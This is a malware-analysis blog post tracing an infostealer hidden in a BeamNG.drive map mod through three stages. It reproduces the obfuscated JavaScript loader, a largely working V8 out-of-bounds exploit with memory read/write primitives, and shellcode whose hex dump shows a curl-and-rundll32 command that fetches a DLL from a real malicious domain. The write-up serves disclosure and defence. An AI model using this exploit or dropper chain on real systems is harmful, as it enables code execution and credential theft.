---
title: How I Found Malware in a BeamNG Mod
description: An analysis using Process Monitor and WinDbg, dealing with JavaScript, WASM, and Windows shellcode.
date: '2025-04-21'
updated:
tags:
  - cybersecurity
  - malware analysis
  - game modding
published: true
---

![Banner](https://private-user-images.githubusercontent.com/49930425/437702523-d9f5482c-d03b-4482-a6c6-4cef4bdb7b43.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDU2NjU0MjQsIm5iZiI6MTc0NTY2NTEyNCwicGF0aCI6Ii80OTkzMDQyNS80Mzc3MDI1MjMtZDlmNTQ4MmMtZDAzYi00NDgyLWE2YzYtNGNlZjRiZGI3YjQzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDI2VDEwNTg0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTdlNDdlY2ZkZTNhMWEwODY3NzkzYzk1MDdjNGYwNGU4NGE3Y2Q0Njg5MDQ0YTIyNTU3NjM1NWE5MmJhNDIwZTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.S8bpjdd7A2GQA2pTT74zweGTIBa7SFhqwjJ40t9ur7A)

> **WARNING**: This post contains snippets of code from real malware.
> Do not run any of the code in this post outside of a secure, isolated virtual machine.

Last week, I fired up [BeamNG.drive](https://www.beamng.com/game/) hoping to enjoy a ride around Belasco City.
But, just after I launched the game, I noticed an odd notification from my antivirus software.

![AV alert](https://private-user-images.githubusercontent.com/49930425/437702510-9ad8893f-86f3-4bd3-8ea8-e2d57c14e016.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDU2NjU0MjQsIm5iZiI6MTc0NTY2NTEyNCwicGF0aCI6Ii80OTkzMDQyNS80Mzc3MDI1MTAtOWFkODg5M2YtODZmMy00YmQzLThlYTgtZTJkNTdjMTRlMDE2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDI2VDEwNTg0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU0MGRkOTgyMTA4ZmEzMTRmY2U3NzZiZjAzMTQzZDY2ZmFhNDVmMmRiOTJiNGUzZmE5Mzk1YmNjMzhjMmM1MmImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ozW13KPi3atFnKctG_mNoSYj6bRPsSlxbndJ6uNI3bg)

`curl.exe`? That can't be good.
Cloudflare Radar [confirmed](https://radar.cloudflare.com/scan/a5c7ceb7-ec86-456f-adfc-dbfa1e8c41ba/summary) the domain `curl` tried to access is known to be malicious.
At this point, however, I wasn't 100% sure this came from the game.

## Starting the investigation

To find out if the problem was indeed in the game, I re-launched it with [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) running.
Filtering through the events, my suspicion was confirmed: a process launching `cmd` with a `curl` command was spawned by the game.

![Process monitor screenshot](https://private-user-images.githubusercontent.com/49930425/437702529-67aabcf5-4a1e-4084-8c2d-46c993163a2e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDU2NjU0MjQsIm5iZiI6MTc0NTY2NTEyNCwicGF0aCI6Ii80OTkzMDQyNS80Mzc3MDI1MjktNjdhYWJjZjUtNGExZS00MDg0LThjMmQtNDZjOTkzMTYzYTJlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDI2VDEwNTg0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUwMmNlMTlkMDE5MWMyNDMzMDBlZTMyODU2NDJhODVkMzRlYmE4MmE1NzU4NTJiZDZjNmI4NzU2OGQ3MDUxNWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.kMxgaLT2QfWtr6bo69T318P7nCb2gPnmh_yJdsCahh0)

But where exactly was this command coming from? Was it a mod, or was the game itself compromised?

Inspecting the call stack in Process Monitor shows the command was executed by calling [`WinExec`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec), a legacy function from 16-bit Windows that is commonly used in shellcode malware.

![Stack screenshot](https://private-user-images.githubusercontent.com/49930425/437702559-5a2466a4-18a6-4ea0-81a4-c0eaf4fb0ab9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDU2NjU0MjQsIm5iZiI6MTc0NTY2NTEyNCwicGF0aCI6Ii80OTkzMDQyNS80Mzc3MDI1NTktNWEyNDY2YTQtMThhNi00ZWEwLTgxYTQtYzBlYWY0ZmIwYWI5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDI2VDEwNTg0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThkNzNlZGQzNDg3Njk5MTU4MmM5NmIxNmFjMmU5M2EwZDM4MWFkNTk1ODc4MGMyNzBmNWFhMGQzMjQ0Nzk1NDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.w2q3y0_29mml64kp7E7u7nILuzz6b8hqDpCuuIw-L5A)

To take a closer look, I attached the [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) debugger to the game process and set a breakpoint on `WinExec`.
When the malicious code tries to run the command, the debugger will pause the process and allow me to inspect the call stack and memory.
That breakpoint was hit at the exact moment I opened the in-game mod manager.

WinDbg shows which memory address `WinExec` was called at, and we can use that to find the shellcode that executed the command.

![WinDbg screenshot](https://private-user-images.githubusercontent.com/49930425/437702567-dc428dce-99fe-420e-b9ec-a6656e472e31.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDU2NjU0MjQsIm5iZiI6MTc0NTY2NTEyNCwicGF0aCI6Ii80OTkzMDQyNS80Mzc3MDI1NjctZGM0MjhkY2UtOTlmZS00MjBlLWI5ZWMtYTY2NTZlNDcyZTMxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA0MjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNDI2VDEwNTg0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUwYWViNDczYzJlZTM4NGVlYzQ3NTE5MGI0MTE3ZTUxYzE0MTJjMTAxNTBjZGY5YzZkODk0YTcyZjJjYWNhNWQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.h5ltTpQw_lhPt0Frn42uTF7nDbw7XsxmrX_kfy-eZzg)

But how did this shellcode even get there in the first place?
Unfortunately, the call stack doesn't show us which file it came from, but it does contain another clue: `libcef`.
This refers to the [Chromium Embedded Framework](https://bitbucket.org/chromiumembedded/cef), which suggests a vulnerability in Chromium might have been exploited to insert the shellcode into memory.
BeamNG.drive uses Chromium to render parts of the UI, including the mod manager where the malicious code was executed.

I disabled all my downloaded mods and dug deeper.

## The mod

I had a few more clues to help narrow down my search:

1. When I previously played the game 2 months ago, there was nothing suspicious.
2. The malicious command was spawned when I opened the in-game mod manager.
3. Disabling all mods stopped the suspicious event from appearing.

Using this info, I focused on the mods I had installed or updated in the last 2 months.
After unpacking the mod `.zip` files and searching through dozens upon dozens of Lua files, I found... nothing.
Looking through that many files was just too slow. I needed to find out exactly which mod was causing the problem.

With any luck, the moment I enabled the problematic mod, the suspicious event would reappear, so I started to enable them one by one.
And sure enough, it came back when I turned on a mod called *American Road*.

## The dropper

Now that I knew which mod was the culprit, finding the malicious code should be much easier.

### First stage

It didn't take long to find some suspicious JavaScript code in a file named `american_road_patreon_banner.js`.

```javascript
// create banner and load compiled css
const baseFolder = "/ui/modModules/american_road_patreon_banner"
var xhr = new XMLHttpRequest();
xhr.open('GET', baseFolder + "/banner.c_css", true);
xhr.responseType = "arraybuffer"; 
xhr.onload = () => {
  if (xhr.status === 200) {
    var compiledcss = new TextDecoder().decode(xhr.response);
    var styles = ((s, k) => [...s]
    .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
    .join(''))(compiledcss, "css");
    setTimeout(() => {
      var bannerImage = document.createElement("img", [].constructor.constructor(styles)());
      bannerImage.id = "patreon-banner"
      bannerImage.src = baseFolder + "/banner.gif";
      bannerImage.style = "display:none; padding-top: 2.6rem;";
      document.body.appendChild(bannerImage);
    }, 500)      
  }
};
xhr.send();

// handle showing and hiding of banner
// when the player is on american road and is in the escape menu, the banner will show
export default angular.module('american_road_patreon_banner', ['ui.router'])
.config(['$stateProvider', function($stateProvider) {
  $stateProvider.state('menu.american_road_patreon_banner', {
    url: '/american_road_patreon_banner',
    templateUrl: '/ui/modModules/american_road_patreon_banner/american_road_patreon_banner.html',
    controller: 'AMPatreonBannerController',
  })
}])
// ...irrelevant code truncated
```

At first glance, this looks like a harmless script that shows a Patreon banner when the player uses the *American Road* map.
But on closer inspection, there are a few things that look off:

- The `american_road_patreon_banner.html` file that's referenced in the script does not actually exist.
- It attempts to load a "compiled CSS" file called `banner.c_css` using an `XMLHttpRequest`, which seems unnecessarily complex.

  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open('GET', baseFolder + "/banner.c_css", true);
  xhr.responseType = "arraybuffer"; 
  ```

- After loading the "compiled CSS", the script decodes it using bitwise XOR with the string `css`.

  ```javascript
  var compiledcss = new TextDecoder().decode(xhr.response);
  var styles = ((s, k) => [...s]
  .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
  .join(''))(compiledcss, "css");
  ```

The most suspicious part is `[].constructor.constructor(styles)()`.
Let's break this expression down into its components:

- `[]` is an empty array literal.
- `[].constructor` is the constructor of the array type, which is a function.
- Functions in JavaScript are objects too, of the `Function` type, so `[].constructor.constructor` is the [constructor of the `Function` type](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function#constructor).
- `(styles)` calls the `Function` constructor creating a new function from the string `styles`.
- `()` calls the newly created function.

A deobfuscated version of this would look like `Function(styles)()`, which is essentially the same as `eval(styles)`, but disguised to seem like legitimate code.

Another interesting file is a Lua script that reloads the user interface after the mod is loaded, which the author of the dropper was kind enough to document for us.

```lua
-- beamng race condition causes ui files from mods to not be found when the ui gets loaded
-- since the mod zip file gets mounted AFTER the ui loads.
-- we reload once to load all missing ui modules
reloadUI()
```

Obviously, there was quite a bit of effort put into testing this dropper and ensuring it executes the JavaScript code.
They even went as far as finding the correct Patreon link of the original mod author for the GIF banner image.

We've now established that this code is dynamically executing some hidden JavaScript, but what exactly is it executing?

### Second stage

Remember that "compiled CSS" file? The first 3 lines look like this:

```text
␏␖ C␐␜
␅␖␑ ␚␌␝,␁␆␕␅␖␁^␝␖␔S2␑␁␒␚1␆␅␕␖␑[KJ_␕␏␜␒␗,␅
␖␄^␝␖␔S5␏␜␒␗EG"␁␁␂
```

Clearly, the data is not in plain text, so we need to decode it.
I used this snippet from the original JavaScript, replacing the `eval`-like part with `console.log` to see the decoded data.
I also replaced the `XMLHttpRequest` with `fs.readFileSync` and then ran it with Node.js.

```javascript
import fs from 'node:fs';

try {
  const data = fs.readFileSync('banner.c_css');

  var compiledcss = new TextDecoder().decode(data);
  var styles = ((s, k) => [...s]
  .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
  .join(''))(compiledcss, "css");

  console.log(styles);
} catch (err) {
  console.error(err);
}
```

This gives us the second stage of the dropper:

> **WARNING**: THIS IS DANGEROUS CODE.
> Even though I've omitted the bad part of the payload, do not run this unless you know what you're doing.

```javascript
let conversion_buffer = new ArrayBuffer(8),
    float_view = new Float64Array(conversion_buffer),
    int_view = new BigUint64Array(conversion_buffer);
(BigInt.prototype.hex = function () {
    return "0x" + this.toString(16);
}),
    (BigInt.prototype.i2f = function () {
        return (int_view[0] = this), float_view[0];
    }),
    (BigInt.prototype.smi2f = function () {
        return (int_view[0] = this << 32n), float_view[0];
    }),
    (Number.prototype.f2i = function () {
        return (float_view[0] = this), int_view[0];
    }),
    (Number.prototype.f2smi = function () {
        return (float_view[0] = this), int_view[0] >> 32n;
    }),
    (Number.prototype.i2f = function () {
        return BigInt(this).i2f();
    }),
    (Number.prototype.smi2f = function () {
        return BigInt(this).smi2f();
    }),
    Array(2 ** 30);
const ui_event_update = 23,
    ui_event_reset = 24,
    ex = 25,
    temp = 33;
let array = [1, 2, , , , 3],
    cnt = 0;
var tarray, farray, obj;
function test(r) {
    return r.map(function (r, t) {
        if (
            (0 == t &&
                ((farray = [0.1, 0.2]),
                ((tarray = new BigUint64Array(2))[0] = 0x41414141n),
                (tarray[1] = 0x42424242n),
                ((obj = { a: 825373492, b: 1 }).b = obj)),
            t > 23)
        )
            throw "stop";
        return t;
    });
}
function gfxbuffer() {
    for (let r = 0; r < 10 ** 5; r++) test(array);
    (array.length = 33554431),
        array.fill(1, 23, 24),
        array.fill(1, 25),
        array.push(2),
        (array.length += 500),
        (cnt = 1);
    try {
        test(array);
    } catch (r) {
        return test_array();
    }
    return False;
}
function test_array() {
    return (
        (success = !0),
        (success &= 1094795585 == farray[27].f2i()),
        (success &= 1111638594 == farray[28].f2i()),
        (success &= 0x3132333400000000 == farray[32].f2i()),
        success
    );
}
function rq(r) {
    let t = farray[25];
    farray[25] = (r - 0x1fn).i2f();
    let n = tarray[0];
    return (farray[25] = t), n;
}
function wq(r, t) {
    let n = farray[25];
    (farray[25] = (r - 0x1fn).i2f()), (tarray[0] = t), (farray[25] = n);
}
function addrof(r) {
    return (obj.b = r), farray[33].f2i();
}
function cpy(r, t) {
    t.forEach((t, n) => {
        wq(r + BigInt(n), BigInt(t));
    });
}
function parse_css() {
    const r = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 6,
            129, 128, 128, 128, 0, 0, 7, 133, 128, 128, 128, 0, 1, 1, 97, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128,
            128, 128, 0, 0, 65, 0, 11,
        ]),
        t = new WebAssembly.Instance(new WebAssembly.Module(r)).exports.a;
    gfxbuffer();
    let n = rq(addrof(t) - 1n + 24n) - 1n,
        e = rq(n + 8n) - 1n,
        a = rq(e + 16n) - 1n;
    cpy(
        rq(a + 0xe8n) + 0n,
        [
            72, 131, 236, 40, 101, 72, 139, 4, 37, 96, 0, 0, 0, 69, 51, 219, 72, 139, 72, 24, 72, 139, 65, 32, 72, 139,
            // ...truncated
        ],
    ),
        setTimeout(t, 1e3);
}
parse_css();
```

There's a lot going on here, but in essence this code exploits a vulnerability in Chromium's V8 JavaScript engine to write machine code to an out-of-bounds executable memory location.

Here's a high-level overview:

- We start with a WebAssembly module that is defined and instantiated in the JavaScript.

  ```javascript
  const r = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 6,
            129, 128, 128, 128, 0, 0, 7, 133, 128, 128, 128, 0, 1, 1, 97, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128,
            128, 128, 0, 0, 65, 0, 11,
        ]),
        t = new WebAssembly.Instance(new WebAssembly.Module(r)).exports.a;
  ```

  The contents of this module are not really important, as long as it exports a function.
  In this case, it's a function called `a` that returns `0`.

  ```wasm
  (module
    (type (;0;) (func (result i32)))
    (func (;0;) (type 0) (result i32)
      i32.const 0
    )
    (export "a" (func 0))
  )
  ```

- The `gfxbuffer` function is called, which sets the stage for out-of-bounds memory reading and writing.

- The memory address of the WASM `a` function is determined.

  ```javascript
  let n = rq(addrof(t) - 1n + 24n) - 1n,
      e = rq(n + 8n) - 1n,
      a = rq(e + 16n) - 1n;
  ```

- A shellcode is copied into where the `a` function is located in memory.

  ```javascript
  cpy(
      rq(a + 0xe8n) + 0n,
      [
          72, 131, 236, 40, 101, 72, 139, 4, 37, 96, 0, 0, 0, 69, 51, 219, 72, 139, 72, 24, 72, 139, 65, 32, 72, 139,
          // ...truncated
      ],
  ),
  ```

- Finally, the now-modified `a` function is scheduled to run after a 1-second delay.

  ```javascript
  setTimeout(t, 1e3);
  ```

- To make this work, a few primitives are defined:

  - `addrof`: gets the address of an object in memory.
  - `rq`: likely stands for "read quadword", and reads a 64-bit value from a memory address.
  - `wq`: similarly, probably "write quadword", and writes a 64-bit value to memory at a specified address.
  - `cpy`: copies an array of values to a specified memory location.

### Third stage: the shellcode

The data that is copied into executable memory is the shellcode payload we're looking for.
Going deeper down this rabbit hole, we can write the bytes to a file to get a better look at it.

```javascript
import fs from 'node:fs';

const r = new Uint8Array([
    72, 131, 236, 40, 101, 72, 139, 4, 37, 96, 0, 0, 0, 69, 51, 219, 72, 139, 72, 24, 72, 139, 65, 32, 72, 139,
    8, 72, 139, 1, 76, 139, 64, 32, 73, 99, 64, 60, 78, 99, 140, 0, 136, 0, 0, 0, 77, 3, 200, 65, 139, 65, 24,
    133, 192, 116, 88, 69, 139, 81, 32, 72, 137, 92, 36, 32, 72, 187, 87, 105, 110, 69, 120, 101, 99, 0, 15,
    31, 64, 0, 255, 200, 141, 20, 133, 0, 0, 0, 0, 73, 3, 210, 74, 99, 12, 2, 74, 57, 28, 1, 116, 6, 133, 192,
    117, 230, 235, 32, 65, 139, 81, 36, 3, 192, 65, 139, 73, 28, 73, 3, 192, 15, 191, 4, 2, 193, 224, 2, 72,
    152, 73, 3, 192, 76, 99, 28, 1, 77, 3, 216, 72, 139, 92, 36, 32, 186, 0, 0, 0, 0, 72, 141, 13, 10, 0, 0, 0,
    65, 255, 211, 51, 192, 72, 131, 196, 40, 195, 99, 109, 100, 32, 47, 99, 32, 99, 117, 114, 108, 32, 45, 115,
    32, 45, 45, 102, 97, 105, 108, 32, 104, 116, 116, 112, 115, 58, 47, 47, 97, 99, 55, 98, 50, 101, 100, 97,
    54, 102, 49, 52, 46, 100, 97, 116, 97, 104, 111, 103, 46, 115, 117, 47, 50, 119, 51, 101, 57, 56, 116, 53,
    122, 104, 50, 57, 56, 119, 51, 116, 122, 104, 103, 55, 57, 56, 50, 119, 51, 116, 52, 101, 103, 32, 45, 111,
    32, 34, 37, 84, 69, 77, 80, 37, 92, 116, 109, 112, 54, 70, 67, 49, 53, 46, 116, 109, 112, 34, 32, 38, 38,
    32, 109, 111, 118, 101, 32, 34, 37, 84, 69, 77, 80, 37, 92, 116, 109, 112, 54, 70, 67, 49, 53, 46, 116,
    109, 112, 34, 32, 34, 37, 84, 69, 77, 80, 37, 92, 116, 109, 112, 54, 70, 67, 49, 53, 46, 100, 108, 108, 34,
    32, 38, 38, 32, 114, 117, 110, 100, 108, 108, 51, 50, 32, 34, 37, 84, 69, 77, 80, 37, 92, 116, 109, 112,
    54, 70, 67, 49, 53, 46, 100, 108, 108, 34, 44, 109, 97, 105, 110, 0,
])

fs.writeFileSync("shellcode.bin", r);
```

Viewing the resulting file in a hex or text editor reveals the original `curl` command we saw in Process Monitor and WinDbg:

```
Offset  Bytes                                            Ascii
        00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
------  -----------------------------------------------  -----
000000  48 83 EC 28 65 48 8B 04 25 60 00 00 00 45 33 DB  H�ì(eH��%`   E3Û
000010  48 8B 48 18 48 8B 41 20 48 8B 08 48 8B 01 4C 8B  H�H�H�A H��H��L�
000020  40 20 49 63 40 3C 4E 63 8C 00 88 00 00 00 4D 03  @ Ic@<Nc� �   M�
000030  C8 41 8B 41 18 85 C0 74 58 45 8B 51 20 48 89 5C  ÈA�A��ÀtXE�Q H�\\
000040  24 20 48 BB 57 69 6E 45 78 65 63 00 0F 1F 40 00  $ H»WinExec ��@
000050  FF C8 8D 14 85 00 00 00 00 49 03 D2 4A 63 0C 02  ÿÈ���    I�ÒJc��
000060  4A 39 1C 01 74 06 85 C0 75 E6 EB 20 41 8B 51 24  J9��t��Àuæë A�Q$
000070  03 C0 41 8B 49 1C 49 03 C0 0F BF 04 02 C1 E0 02  �ÀA�I�I�À�¿��Áà�
000080  48 98 49 03 C0 4C 63 1C 01 4D 03 D8 48 8B 5C 24  H�I�ÀLc��M�ØH�\$
000090  20 BA 00 00 00 00 48 8D 0D 0A 00 00 00 41 FF D3   º    H���   AÿÓ
0000A0  33 C0 48 83 C4 28 C3 63 6D 64 20 2F 63 20 63 75  3ÀH�Ä(Ãcmd /c cu
0000B0  72 6C 20 2D 73 20 2D 2D 66 61 69 6C 20 68 74 74  rl -s --fail htt
0000C0  70 73 3A 2F 2F 61 63 37 62 32 65 64 61 36 66 31  ps://ac7b2eda6f1
0000D0  34 2E 64 61 74 61 68 6F 67 2E 73 75 2F 32 77 33  4.datahog.su/2w3
0000E0  65 39 38 74 35 7A 68 32 39 38 77 33 74 7A 68 67  e98t5zh298w3tzhg
0000F0  37 39 38 32 77 33 74 34 65 67 20 2D 6F 20 22 25  7982w3t4eg -o "%
000100  54 45 4D 50 25 5C 74 6D 70 36 46 43 31 35 2E 74  TEMP%\tmp6FC15.t
000110  6D 70 22 20 26 26 20 6D 6F 76 65 20 22 25 54 45  mp" && move "%TE
000120  4D 50 25 5C 74 6D 70 36 46 43 31 35 2E 74 6D 70  MP%\tmp6FC15.tmp
000130  22 20 22 25 54 45 4D 50 25 5C 74 6D 70 36 46 43  " "%TEMP%\tmp6FC
000140  31 35 2E 64 6C 6C 22 20 26 26 20 72 75 6E 64 6C  15.dll" && rundl
000150  6C 33 32 20 22 25 54 45 4D 50 25 5C 74 6D 70 36  l32 "%TEMP%\tmp6
000160  46 43 31 35 2E 64 6C 6C 22 2C 6D 61 69 6E 00     FC15.dll",main
```

The bytes before the command are probably x86 instructions that locate and call the `WinExec` function, which is responsible for executing the command.

## The payload

All the code we've seen so far is just to download and execute a DLL file from the Internet.
This DLL is the real malware and a quick [analysis](https://tria.ge/250420-gjl4rsxnx5/behavioral1) reveals it's an infostealer that steals passwords from browsers and the Exodus crypto wallet app.

## So, what now?

After determining which mod is infected, I reached out to the BeamNG team with details about the mod and the malicious code.
Within a few days, the infected mod version was removed from the official repository, and its author's account was suspended because it is very likely compromised.

To prevent incidents like this from happening in the future, the solution could be as simple as updating the Chromium Embedded Framework dependency to a newer version.
WinDbg shows that the game is using version `3.3626.1895.g7001d56` which was released in March 2019 (yes, that's 6 years old already!), and there were quite a few Chromium out-of-bounds access vulnerabilities fixed in the last few years.

Looking through the [mod's page](https://www.beamng.com/resources/american-road.3100/) on the BeamNG website, I found the malicious code was added on April 1st.
The changelog stating "added patreon banner" was the final nail in the coffin.
Unfortunately, over 3500 people had already downloaded the compromised version of the mod before it was removed, so it's possible that some had their passwords or personal information stolen.
VirusTotal [reports](https://www.virustotal.com/gui/file/9ec86514d5993782d455a4c9717ec4f06d0dfcd556e8de6cf0f8346b8b8629d4/detection) that most antivirus programs detect the DLL as malicious, including Microsoft Windows Defender, but there is about a one-week gap between the April 1st update and the first analysis.

Perhaps I'll make a follow-up post reverse-engineering the shellcode and analyzing the DLL in more detail, so stay tuned!

## Summary

In this post, we looked at an infected mod for BeamNG.drive that included obfuscated JavaScript and shellcode.
Starting with an antivirus alert, we used Process Monitor and WinDbg to gather important details, and then uncovered each layer of the malicious code with reverse engineering.
We found that a Chromium vulnerability involving WASM and out-of-bounds memory access was exploited to write shellcode into executable memory.
Finally, we discovered that the shellcode downloads a malicious DLL file that steals passwords and personal information.

Shout-out to [Elliott](https://elliott.diy/) for helping out with the DLL analysis, and a big thank-you to my dad for walking me through WinDbg!

And of course, thank *you* for reading! If you liked this post, please share the link anywhere you like.
